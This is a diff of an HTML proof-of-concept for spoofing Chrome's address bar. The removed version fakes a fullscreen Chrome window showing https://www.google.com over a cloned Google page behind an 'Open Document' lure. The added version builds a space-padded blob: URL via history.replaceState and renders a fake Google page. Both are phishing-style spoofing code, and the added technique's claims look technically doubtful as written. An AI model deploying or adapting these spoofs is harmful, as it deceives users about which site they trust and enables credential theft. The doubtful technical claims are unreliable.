@@ -1,255 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>Secure Document Viewer</title>
-<style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body {
-  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-  background: #f5f5f5;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-}
-
-.landing {
-  text-align: center;
-  padding: 40px;
-  background: #fff;
-  border-radius: 8px;
-  box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-}
-
-.landing h2 { color: #202124; margin-bottom: 16px; }
-.landing p { color: #5f6368; margin-bottom: 24px; }
-.landing button {
-  padding: 12px 32px;
-  background: #1a73e8;
-  color: #fff;
-  border: none;
-  border-radius: 4px;
-  font-size: 16px;
-  cursor: pointer;
-}
-.landing button:hover { background: #1765cc; }
-
-/* Fake Chrome UI */
-.fake-chrome {
-  background: #dee1e6;
-  height: 100vh;
-  display: none;
-}
-
-.fake-tabbar {
-  background: #dee1e6;
-  height: 36px;
-  display: flex;
-  align-items: flex-end;
-  padding: 0 8px;
-}
-
-.fake-tab {
-  background: #fff;
-  border-radius: 8px 8px 0 0;
-  padding: 6px 16px;
-  font-size: 13px;
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  max-width: 240px;
-}
-
-.favicon {
-  width: 16px;
-  height: 16px;
-  border-radius: 2px;
-}
-
-.fake-toolbar {
-  background: #fff;
-  height: 40px;
-  display: flex;
-  align-items: center;
-  padding: 0 8px;
-  gap: 4px;
-  border-bottom: 1px solid #e0e0e0;
-}
-
-.nav-btn {
-  width: 28px;
-  height: 28px;
-  border-radius: 50%;
-  border: none;
-  background: transparent;
-  cursor: pointer;
-  font-size: 16px;
-  color: #5f6368;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-
-.nav-btn:hover { background: #f1f3f4; }
-
-.fake-urlbar {
-  flex: 1;
-  background: #f1f3f4;
-  border-radius: 20px;
-  padding: 6px 12px;
-  font-size: 14px;
-  color: #202124;
-  display: flex;
-  align-items: center;
-  gap: 6px;
-}
-
-.lock-icon { color: #188038; font-size: 14px; }
-
-.fake-content {
-  background: #fff;
-  height: calc(100vh - 76px);
-  overflow-y: auto;
-  padding: 40px;
-}
-
-.google-logo {
-  text-align: center;
-  margin: 100px 0 30px;
-}
-
-.google-logo span {
-  font-size: 90px;
-  font-weight: 500;
-  letter-spacing: -2px;
-}
-
-.search-box {
-  max-width: 584px;
-  margin: 0 auto 30px;
-}
-
-.search-input {
-  width: 100%;
-  padding: 12px 16px;
-  border: 1px solid #dfe1e5;
-  border-radius: 24px;
-  font-size: 16px;
-  outline: none;
-}
-
-.search-input:hover { box-shadow: 0 1px 6px rgba(32,33,36,.28); }
-
-.search-buttons {
-  text-align: center;
-  margin-top: 20px;
-}
-
-.search-btn {
-  background: #f8f9fa;
-  border: 1px solid #f8f9fa;
-  border-radius: 4px;
-  color: #3c4043;
-  font-size: 14px;
-  padding: 10px 16px;
-  margin: 0 4px;
-  cursor: pointer;
-}
-
-.search-btn:hover {
-  box-shadow: 0 1px 1px rgba(0,0,0,.1);
-  border: 1px solid #dadce0;
-}
-</style>
+<title>Chrome blob: Username Padding URL Spoof</title>
 </head>
 <body>
 
-<div class="landing">
-  <h2>📄 View Secure Document</h2>
-  <p>Click below to open the document in fullscreen mode</p>
-  <button id="btn">Open Document</button>
-</div>
+<h1>Chrome URL Bar Spoofing via blob: + Username Padding</h1>
+<p>CVE Pattern: Chrome 35.0.1916.153 - Username part not collapsed when padded</p>
 
-<div class="fake-chrome" id="fakeChrome">
-  <div class="fake-tabbar">
-    <div class="fake-tab">
-      <svg class="favicon" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#4285f4"/><path d="M12 7.5a4.5 4.5 0 100 9 4.5 4.5 0 000-9z" fill="#fff"/></svg>
-      <span>Google</span>
-    </div>
-  </div>
-  <div class="fake-toolbar">
-    <button class="nav-btn">←</button>
-    <button class="nav-btn">→</button>
-    <button class="nav-btn">↻</button>
-    <div class="fake-urlbar">
-      <span class="lock-icon">🔒</span>
-      <span>https://www.google.com</span>
-    </div>
-    <button class="nav-btn">⋮</button>
-  </div>
-  <div class="fake-content">
-    <div class="google-logo">
-      <span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc04">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span>
-    </div>
-    <div class="search-box">
-      <input type="text" class="search-input" placeholder="Search Google or type a URL">
-    </div>
-    <div class="search-buttons">
-      <button class="search-btn">Google Search</button>
-      <button class="search-btn">I'm Feeling Lucky</button>
-    </div>
-  </div>
-</div>
+<button onclick="spoof()">Spoof URL Bar</button>
+<div id="status"></div>
 
 <script>
-document.getElementById("btn").onclick = function() {
-  // Request fullscreen
-  const elem = document.documentElement;
-  if (elem.requestFullscreen) {
-    elem.requestFullscreen();
-  } else if (elem.webkitRequestFullScreen) {
-    elem.webkitRequestFullScreen();
-  } else if (elem.mozRequestFullScreen) {
-    elem.mozRequestFullScreen();
-  } else if (elem.msRequestFullscreen) {
-    elem.msRequestFullscreen();
-  }
+function spoof() {
+  // Original vulnerability: blob: + padded username bypasses URL bar collapse
+  // The username part should be hidden but Chrome fails to collapse it when padded
 
-  // Wait for fullscreen to activate
-  setTimeout(function() {
-    // Hide landing page, show fake Chrome UI
-    document.querySelector('.landing').style.display = 'none';
-    document.getElementById('fakeChrome').style.display = 'block';
+  var targetDomain = "www.google.com";
+  var padding = Array(0x1000).join(" "); // 4096 spaces to prevent collapse
 
-    // Show alert during fullscreen with fake Chrome visible
-    setTimeout(function() {
-      alert(0);
+  // Construct spoofed URL: blob:https://www.google.com[padding]@actual-site.com
+  var spoofedURL = "blob:" + location.protocol + "//" + targetDomain + padding + "@" + location.host;
 
-      // After alert, inject meta refresh to redirect to real Google
-      // This demonstrates the spoofing window: fake UI visible, then redirect
-      const meta = document.createElement('meta');
-      meta.httpEquiv = 'refresh';
-      meta.content = '2;url=https://www.google.com';
-      document.head.appendChild(meta);
+  // Replace URL bar without navigation
+  history.replaceState(null, null, spoofedURL);
 
-      // Show transition message
-      document.querySelector('.fake-content').innerHTML = `
-        <div style="text-align:center;margin-top:150px;">
-          <h2 style="color:#5f6368;font-weight:400;">Redirecting to Google...</h2>
-          <p style="color:#80868b;margin-top:12px;">You will be redirected in 2 seconds</p>
-        </div>
-      `;
-    }, 100);
-  }, 500);
-};
+  // Render fake Google page
+  document.body.innerHTML = `
+    <div style="text-align:center;padding:100px 20px;font-family:Arial">
+      <h1 style="color:#4285f4;font-size:90px;margin:0">Google</h1>
+      <input type="text" placeholder="Search Google" style="width:500px;padding:12px;margin:20px 0;border:1px solid #ddd;border-radius:24px">
+      <br>
+      <button style="padding:10px 20px;margin:5px">Google Search</button>
+      <button style="padding:10px 20px;margin:5px">I'm Feeling Lucky</button>
+      <p style="margin-top:40px;color:#666">URL bar shows: ${targetDomain}</p>
+      <p style="color:#666">Actual origin: ${location.host}</p>
+    </div>
+  `;
+}
 
-// Exit fullscreen on Escape (standard behavior)
-document.addEventListener('fullscreenchange', function() {
-  if (!document.fullscreenElement) {
-    location.reload();
-  }
-});
+// Auto-execute check
+if (location.protocol === "https:") {
+  document.addEventListener('DOMContentLoaded', function() {
+    document.getElementById('status').innerHTML = '<p style="color:green">✓ Running on HTTPS - spoof will work</p>';
+  });
+} else {
+  document.addEventListener('DOMContentLoaded', function() {
+    document.getElementById('status').innerHTML = '<p style="color:red">✗ Must run on HTTPS to spoof https:// URLs</p>';
+  });
+}
 </script>
 
 </body>
